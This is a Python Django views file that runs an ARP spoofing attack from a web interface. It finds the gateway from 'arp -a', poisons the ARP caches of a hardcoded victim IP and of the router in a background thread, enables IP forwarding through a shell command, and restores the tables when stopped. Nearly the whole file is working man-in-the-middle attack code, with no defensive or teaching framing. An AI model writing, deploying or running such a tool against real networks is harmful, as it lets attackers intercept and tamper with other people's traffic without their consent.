from django.http import JsonResponse, HttpResponseRedirect
from django.shortcuts import render, redirect
from django.contrib import messages
import threading
import time
import scapy.all as scapy
import subprocess
import re

# Global 
is_spoofing = False
packet_count = 0

# Utility Functions
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Spoofing Thread
def spoofing_thread(victim_ip, router_ip):
    global is_spoofing, packet_count
    try:
        while is_spoofing:
            spoof(victim_ip, router_ip)
            spoof(router_ip, victim_ip)
            packet_count += 2
            print(f"\r[+] Packets sent: {packet_count}", end="", flush=True)
            time.sleep(2)
    except Exception as e:
        print(f"[ERROR] {str(e)}")
    finally:
        is_spoofing = False

# Views
def index(request):
    global is_spoofing
    return render(request, "arp_spoofer/index.html", {"is_spoofing": is_spoofing})


def start_spoofing(request):
    global is_spoofing, packet_count
    if request.method == "POST":
        victim_ip = "172.16.149.163"  # Fixed victim IP for now

        # Fetch the gateway IP dynamically
        try:
            result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode != 0:
                messages.error(request, "Failed to execute arp command to find gateway.")
                return redirect("arp_spoofer:index")

            gateway_pattern = r"_gateway \(([\d.]+)\) at ([\da-f:]+)"
            match = re.search(gateway_pattern, result.stdout)
            if not match:
                messages.error(request, "Gateway not found in ARP table.")
                return redirect("arp_spoofer:index")

            router_ip = match.group(1)  # Extracted gateway IP
        except Exception as e:
            messages.error(request, f"Error finding gateway: {e}")
            return redirect("arp_spoofer:index")

        if is_spoofing:
            messages.error(request, "Spoofing is already running.")
            return redirect("arp_spoofer:index")

        # Enable port forwarding
        try:
            subprocess.run(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True, check=True)
            messages.success(request, "Port forwarding has been enabled on this machine.")
        except subprocess.CalledProcessError as e:
            messages.error(request, f"Failed to enable port forwarding: {e}")
            return redirect("arp_spoofer:index")

        # Start spoofing
        is_spoofing = True
        packet_count = 0  # Reset packet count when spoofing starts
        thread = threading.Thread(target=spoofing_thread, args=(victim_ip, router_ip))
        thread.daemon = True
        thread.start()
        messages.success(request, f"Spoofing started successfully. Gateway IP: {router_ip}")
        return redirect("arp_spoofer:index")

def stop_spoofing(request):
    global is_spoofing
    if request.method == "POST":
        if not is_spoofing:
            messages.error(request, "Spoofing is not running.")
            return redirect("arp_spoofer:index")

        is_spoofing = False
        time.sleep(3)  # Allow spoofing thread to exit

        # Fetch the gateway IP dynamically
        try:
            result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode != 0:
                messages.error(request, "Failed to execute arp command to find gateway.")
                return redirect("arp_spoofer:index")

            gateway_pattern = r"_gateway \(([\d.]+)\) at ([\da-f:]+)"
            match = re.search(gateway_pattern, result.stdout)
            if not match:
                messages.error(request, "Gateway not found in ARP table.")
                return redirect("arp_spoofer:index")

            router_ip = match.group(1)  # Extracted gateway IP
        except Exception as e:
            messages.error(request, f"Error finding gateway: {e}")
            return redirect("arp_spoofer:index")

        victim_ip = "172.16.149.163"  # Fixed victim IP for now
        restore(victim_ip, router_ip)
        restore(router_ip, victim_ip)
        print("[+] Spoofing stopped and ARP tables restored.")
        messages.success(request, "Spoofing stopped successfully.")
        return redirect("arp_spoofer:index")





def get_packet_count(request):
    global packet_count
    return JsonResponse({"packet_count": packet_count})


def find_gateway(request):
    """
    Captures the router's IP and MAC address dynamically using the `arp -a` command.
    """
    try:
        # Execute the `arp -a` command
        result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode != 0:
            return JsonResponse({"error": "Failed to execute arp command", "details": result.stderr}, status=500)

        # Parse the output to find the gateway's IP and MAC address
        gateway_pattern = r"_gateway \(([\d.]+)\) at ([\da-f:]+)"
        match = re.search(gateway_pattern, result.stdout)

        if not match:
            return JsonResponse({"error": "Gateway not found in ARP table"}, status=404)

        # Extract the IP and MAC address from the match
        ip_address, mac_address = match.groups()
        return JsonResponse({"ip_address": ip_address, "mac_address": mac_address})

    except Exception as e:
        return JsonResponse({"error": str(e)}, status=500)